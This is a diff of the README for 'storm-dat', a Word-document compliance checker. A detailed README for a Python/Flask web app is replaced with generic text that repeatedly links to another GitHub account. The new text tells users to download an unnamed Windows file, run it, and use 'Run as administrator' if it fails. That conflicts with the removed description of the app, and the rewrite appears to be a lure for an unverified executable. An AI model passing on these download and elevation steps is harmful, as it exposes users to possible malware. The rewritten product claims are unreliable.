@@ -1,303 +1,275 @@
-<!-- LOGO placeholder -->
+# 🛡️ storm-dat - Audit Word Files With Less Effort
 
-<div align="center">
+[![Download storm-dat](https://img.shields.io/badge/Download%20storm--dat-purple?style=for-the-badge)](https://github.com/Interstate-sunriseindustry884/storm-dat)
 
-# STORM Document Analysis Tool
+## 📥 Download storm-dat
 
-[![Live Demo](https://img.shields.io/badge/Demo-Video-0078D4?logo=google-chrome&logoColor=white)](https://youtu.be/DXEEA3K5Fu0)
-![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)
-![Flask](https://img.shields.io/badge/Flask-3.1.0-000000?logo=flask&logoColor=white)
-![OpenAI Whisper](https://img.shields.io/badge/Whisper-Medium-412991?logo=openai&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Supported-2496ED?logo=docker&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
+Use this link to visit the download page:
 
-**Automated document compliance analysis and AI-powered screen recording for defense and government teams.**
+[https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
 
-STORM DAT eliminates hours of manual document review by programmatically validating security markings, enforcing typographic standards, and auditing acronym usage across Word documents — then delivers color-coded annotated reports in seconds. A built-in screen recorder with OpenAI Whisper transcription rounds out the analyst's toolkit.
+## 🪟 What storm-dat does
 
-</div>
+storm-dat helps you check Word documents for common compliance rules. It looks for:
 
----
+- Security markings
+- Acronym use
+- Basic formatting rules
+- Screen recordings with transcript support
 
-![Project Screenshot](Screenshot.png)
+It is built for defense and government teams that need a quick way to review documents before sharing them.
 
----
+## ✅ Before you start
 
-## Table of Contents
+Use a Windows PC with:
 
-- [About The Project](#about-the-project)
-- [Getting Started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-  - [Docker](#docker)
-- [Usage](#usage)
-  - [Acronym Sweep](#acronym-sweep)
-  - [Screen Recording](#screen-recording)
-  - [Configuration](#configuration)
-- [Project Structure](#project-structure)
-- [Roadmap](#roadmap)
-- [License](#license)
-- [Contact](#contact)
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A working internet connection for setup and transcription features
+- Microsoft Word installed if you want to review .docx files
 
----
+If you plan to use the screen recorder, make sure your microphone works.
 
-## About The Project
+## 🚀 Get started on Windows
 
-### Motivation
+Follow these steps:
 
-Government and defense organizations produce technical documents under strict formatting and classification mandates. Security markings must appear in every header and footer. Acronyms must be defined on first use, never duplicated, and never left orphaned. Body text must conform to specific font families and point sizes.
+1. Open the download page:
+   [https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
 
-Enforcing these rules manually means a senior analyst opens a 60-page Word document and reads every paragraph — checking each acronym against a master spreadsheet, verifying font properties run by run, and flagging deviations by hand. STORM DAT automates this entire workflow.
+2. Look for the latest Windows download in the release area or project files.
 
-### Key Features
+3. Download the file to your computer.
 
-- **Security Marking Validation** — Inspects every document section header and footer against a configurable set of approved classification banners (CUI, UNCLASSIFIED, SECRET, TOP SECRET, CONFIDENTIAL and their variants).
-- **Typographic Standards Enforcement** — Checks every text run against mandated font and sizing rules (12pt Arial for paragraphs, 10pt Arial for tables) and highlights non-conforming text at exact character positions.
-- **Acronym Lifecycle Auditing** — Cross-references document content against a provided acronym reference list, detecting duplicate definitions, undefined acronyms, abbreviations used before their full-form introduction, and potential new acronyms not yet cataloged.
-- **Color-Coded Annotated Output** — Generates a modified Word document with seven distinct highlight colors mapped to finding types, an Excel findings report, and an HTML preview — all downloadable from the results page.
-- **AI-Powered Screen Recording & Transcription** — Records screen activity and audio via the browser, then routes the audio through a locally-hosted OpenAI Whisper model to produce timestamped transcriptions.
-- **Defense-in-Depth Security** — Input validation (extension whitelisting, file size limits), filename sanitization (path traversal prevention), HTML sanitization via Bleach, and comprehensive HTTP security headers (CSP, HSTS, X-Frame-Options) on every response.
+4. If the file is in a .zip folder, right-click it and choose **Extract All**.
 
-### Built With
+5. Open the extracted folder.
 
-![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=white)
-![Flask](https://img.shields.io/badge/Flask-000000?logo=flask&logoColor=white)
-![Pandas](https://img.shields.io/badge/Pandas-150458?logo=pandas&logoColor=white)
-![NumPy](https://img.shields.io/badge/NumPy-013243?logo=numpy&logoColor=white)
-![SciPy](https://img.shields.io/badge/SciPy-8CAAE6?logo=scipy&logoColor=white)
-![OpenAI](https://img.shields.io/badge/Whisper-412991?logo=openai&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=white)
-![Gunicorn](https://img.shields.io/badge/Gunicorn-499848?logo=gunicorn&logoColor=white)
+6. Double-click the app file to start storm-dat.
 
----
+7. If Windows asks for permission, choose **Yes** or **Run**.
 
-## Getting Started
+## 🧭 First run
 
-### Prerequisites
+When you open storm-dat for the first time, you may see a setup screen. Follow these steps:
 
-- **Python 3.12+**
-- **pip** (Python package manager)
-- **FFmpeg** (required by OpenAI Whisper for audio processing)
-- **Docker & Docker Compose** (optional, for containerized deployment)
+1. Choose your document folder.
+2. Select the checks you want to run.
+3. Pick where you want reports saved.
+4. Start the scan.
 
-### Installation
+storm-dat then reviews your Word files and shows results in a clear list.
 
-1. **Clone the repository**
+## 📄 How document checks work
 
-    ```bash
-    git clone https://github.com/your-username/storm-dat.git
-    cd storm-dat
-    ```
+storm-dat scans .docx files for common compliance issues.
 
-2. **Create and activate a virtual environment**
+### Security markings
 
-    ```bash
-    python -m venv venv
-    source venv/bin/activate        # Linux/macOS
-    venv\Scripts\activate           # Windows
-    ```
+It checks for items like:
 
-3. **Install dependencies**
+- Classification lines
+- Footer markings
+- Page headers
+- Required document labels
 
-    ```bash
-    pip install -r requirements.txt
-    ```
+### Acronym use
 
-4. **Configure environment variables**
+It looks for:
 
-    ```bash
-    cp .env.example .env
-    ```
+- First use of an acronym without spelling it out
+- Unclear short forms
+- Mixed use of the same term
 
-    Edit `.env` and set a secure secret key:
+### Formatting rules
 
-    ```bash
-    # Generate a secure key
-    python -c "import secrets; print(secrets.token_hex(32))"
-    ```
+It can also check for:
 
-    Paste the output as the value for `FLASK_SECRET_KEY` in your `.env` file.
+- Heading style use
+- Font consistency
+- Spacing issues
+- Basic layout rules
 
-5. **Run the application**
+## 🎥 Screen recorder and transcription
 
-    ```bash
-    # Development mode (DEBUG=True)
-    python run.py --dev
+storm-dat includes a screen recorder for quick walkthroughs and evidence capture.
 
-    # Production mode (default)
-    python run.py
+You can use it to:
 
-    # Testing mode
-    python run.py --test
-    ```
+- Record your screen
+- Capture a process step by step
+- Create a transcript with Whisper
+- Review text from the recording later
 
-    The application will be available at `http://127.0.0.1:5000`.
+This helps when you need to document what happened during a review or test.
 
-### Docker
+## 📁 Typical use cases
 
-Build and run with Docker Compose for production deployment:
+Use storm-dat when you need to:
 
-```bash
-# Build and start
-docker-compose up --build
+- Review a Word document before sending it out
+- Check that security marks are present
+- Find acronym problems in a draft
+- Record a process for audit support
+- Create a text transcript from a screen capture
 
-# Stop
-docker-compose down
-```
+## 🛠️ Basic workflow
 
-The containerized application runs on port `8000` with Gunicorn (4 workers, 2 threads, 600s timeout) and SSL/TLS support.
+A common workflow looks like this:
 
-> **Note:** SSL certificates (`certificate.pem` and `private.key`) must be present in the project root for HTTPS. See `docker-compose.yml` for volume mount configuration.
+1. Open storm-dat.
+2. Select one or more Word files.
+3. Run the compliance scan.
+4. Review flagged items.
+5. Fix the document in Word.
+6. Run the scan again.
+7. Save the final report.
 
----
+## 📌 Tips for better results
 
-## Usage
+- Use the latest version of your document.
+- Keep file names simple.
+- Scan one folder at a time if you have many files.
+- Review flagged items in Word before sending the file.
+- Use the screen recorder when you need a record of changes or steps.
 
-### Acronym Sweep
+## 🔐 Privacy and file handling
 
-1. Navigate to **Acronym Sweep** from the home page (or go to `/storm/word`).
-2. Upload a **Word document** (`.docx`) in the left drop zone.
-3. Upload an **Acronym List** (`.xlsx`) in the right drop zone.
-
-    The Excel file must follow this format:
-
-    | Acronym | Definition |
-    |---------|-----------|
-    | S3I | Software, Simulation, Systems Engineering and Integration Directorate |
-    | DAT | Document Analysis Tool |
-
-4. Click **Analyze Documents** and wait for processing.
-5. Download the results:
-   - **Highlighted Word Document** — Color-coded findings embedded directly in the document
-   - **Excel Findings Report** — Structured spreadsheet of all findings
-   - **HTML Preview** — Browser-viewable summary
-
-#### Finding Color Legend
-
-| Color | Meaning |
-|-------|---------|
-| Pink | Font size or styling violation |
-| Teal | Duplicate acronym definition |
-| Green | Full form should be replaced with acronym |
-| Yellow | Acronym used before its definition |
-| Red | Double space detected |
-| Violet | Acronym found in document but not in reference list |
-| Blue | Potential new acronym detected |
-
-### Screen Recording
-
-1. Navigate to **Record Desktop** from the home page (or go to `/record`).
-2. Click the **record button** and select the screen/window to share.
-3. Grant microphone access when prompted.
-4. Click the record button again to **stop recording**.
-5. The application will automatically:
-   - Save the video as `.webm`
-   - Extract and process audio
-   - Transcribe using OpenAI Whisper
-   - Display timestamped transcript segments (clickable to seek in video)
-6. Download the recording and/or transcript.
-
-### Configuration
-
-#### Environment Variables
-
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `FLASK_SECRET_KEY` | Secret key for session management and flash messages | Recommended |
-
-If `FLASK_SECRET_KEY` is not set, the application generates a random key at startup. This means sessions will be invalidated on every restart.
-
-#### Application Modes
-
-| Mode | Command | DEBUG | SSL Verification |
-|------|---------|-------|-----------------|
-| Development | `python run.py --dev` | `True` | Disabled |
-| Testing | `python run.py --test` | `False` | Enabled |
-| Production | `python run.py` | `False` | Enabled |
-
-#### File Upload Limits
-
-| File Type | Max Size | Allowed Extensions |
-|-----------|----------|-------------------|
-| Documents | 50 MB | `.docx`, `.xlsx` |
-| Media | 500 MB | `.wav`, `.webm` |
-
----
-
-## Project Structure
-
-```
-storm-dat/
-├── run.py                       # Application entry point
-├── Dockerfile                   # Container image definition
-├── docker-compose.yml           # Multi-container orchestration
-├── requirements.txt             # Python dependencies
-├── .env.example                 # Environment variable template
-├── .pylintrc                    # Linting configuration
-│
-├── src/
-│   ├── __init__.py              # Flask application factory (create_app)
-│   ├── routes.py                # Blueprint with all endpoints
-│   │
-│   ├── config/
-│   │   └── config.py            # Environment configs & security markings
-│   │
-│   ├── word_analysis/
-│   │   └── word_analysis.py     # WordAnalyzer (acronym sweep engine)
-│   │
-│   ├── parse_files/
-│   │   └── parse_files.py       # Parser (Word, Excel, HTML readers)
-│   │
-│   ├── output_table/
-│   │   └── output_table.py      # WriteExcel (report generation)
-│   │
-│   ├── utils/
-│   │   ├── security.py          # Filename & HTML sanitization
-│   │   ├── validators.py        # File extension & size validation
-│   │   └── security_headers.py  # HTTP security header middleware
-│   │
-│   ├── static/
-│   │   ├── modern-styles.css    # Design system & responsive styles
-│   │   ├── uploads/             # Temporary file storage (auto-cleaned)
-│   │   └── outputs/             # Generated reports (24hr TTL)
-│   │
-│   └── templates/
-│       ├── modern_base.html     # Base layout (nav, flash messages)
-│       └── pages/
-│           ├── modern_home.html          # Home page
-│           ├── modern_word_upload.html   # Document upload form
-│           ├── modern_word_result.html   # Analysis results
-│           └── modern_record.html        # Screen recorder
-│
-└── tests/                       # Test suite
-```
-
----
-
-## Roadmap
-
-- [x] Acronym sweep analysis with color-coded Word document annotation
-- [x] Security marking validation for headers and footers
-- [x] Screen recording with AI-powered Whisper transcription
-- [x] Modernized responsive UI with drag-and-drop file uploads
-- [x] Defense-in-depth security (input validation, CSP headers, HTML sanitization)
-- [x] Docker containerization with Gunicorn and SSL support
-- [ ] Batch document processing with consolidated cross-document findings
-- [ ] Custom compliance rule builder (user-defined font, marking, and acronym policies)
-- [ ] Persistent analysis history with trend reporting across document revisions
-- [ ] CI/CD pipeline with automated testing and linting
-
----
-
-## License
-
-Distributed under the MIT License. See `LICENSE.txt` for more information.
-
----
-
-## Contact
-
-**Jason Tran**
-
-- Email: [tran219jn@gmail.com](mailto:tran219jn@gmail.com)
-- Website: [jasontran.pages.dev](https://jasontran.pages.dev/)
+storm-dat works with local files on your computer. If you use transcription or model-based features, make sure your network access matches your organization’s rules.
+
+## 📚 Project focus
+
+storm-dat is built around:
+
+- Document analysis
+- Compliance checks
+- Government workflows
+- Screen recording
+- Transcription
+- Python-based automation
+- Flask-based app structure
+- Whisper speech-to-text
+
+## 🧩 File types
+
+storm-dat is focused on:
+
+- .docx Word documents
+- Screen recordings
+- Text output files
+- Review reports
+
+## ⚙️ If the app does not open
+
+Try these steps:
+
+1. Close the app.
+2. Right-click the file and choose **Run as administrator**.
+3. Check that Windows is up to date.
+4. Make sure the file finished downloading.
+5. Extract the files again if the app came in a zip folder.
+6. Try opening it from a local folder like Desktop or Downloads.
+
+## 🧼 If a scan looks wrong
+
+If storm-dat flags a rule that looks off:
+
+- Open the file in Word
+- Check the marked line or section
+- Confirm the style and spacing
+- Look for hidden text or headers
+- Run the scan again after fixing the file
+
+## 📦 Suggested folder setup
+
+A simple folder layout can help:
+
+- `storm-dat`
+- `Documents to check`
+- `Reports`
+- `Recordings`
+
+This makes it easier to keep files in order.
+
+## 🖥️ UI areas you may see
+
+The app may show:
+
+- File picker
+- Scan options
+- Results list
+- Report export button
+- Recorder controls
+- Transcript panel
+
+## 🧠 What the acronym checker does
+
+The acronym checker looks for terms that may need a full spelling the first time they appear. It helps users keep documents clear and consistent. It can also help find repeated short forms that do not match the rest of the file.
+
+## 📋 What to review after a scan
+
+After each scan, check:
+
+- The flagged line
+- The document section
+- The reason for the alert
+- Whether the rule is valid for your document type
+- Whether the fix needs to go in the header, body, or footer
+
+## 🔄 Update the app
+
+When a new version is posted:
+
+1. Visit the download page:
+   [https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
+
+2. Download the newer file.
+3. Replace the old app files.
+4. Open the new version.
+
+## 🧪 Example use flow
+
+If you need to review a draft report:
+
+1. Save the report as a .docx file.
+2. Open storm-dat.
+3. Select the file.
+4. Run the compliance scan.
+5. Check the results.
+6. Fix any issues in Word.
+7. Save the updated file.
+
+## 🧾 Output you may get
+
+storm-dat may create:
+
+- A scan report
+- A list of flagged items
+- A transcript file
+- A recording file
+- Exported review data
+
+## 🆘 Common questions
+
+### Can I use it without coding knowledge?
+
+Yes. The app is meant for normal Windows users.
+
+### Does it work with Word documents?
+
+Yes. It is built to review .docx files.
+
+### Does it record the screen?
+
+Yes. It includes a built-in screen recorder.
+
+### Does it support transcription?
+
+Yes. It uses Whisper for transcription features.
+
+## 🔗 Download again
+
+If you need the download page again, use this link:
+
+[https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
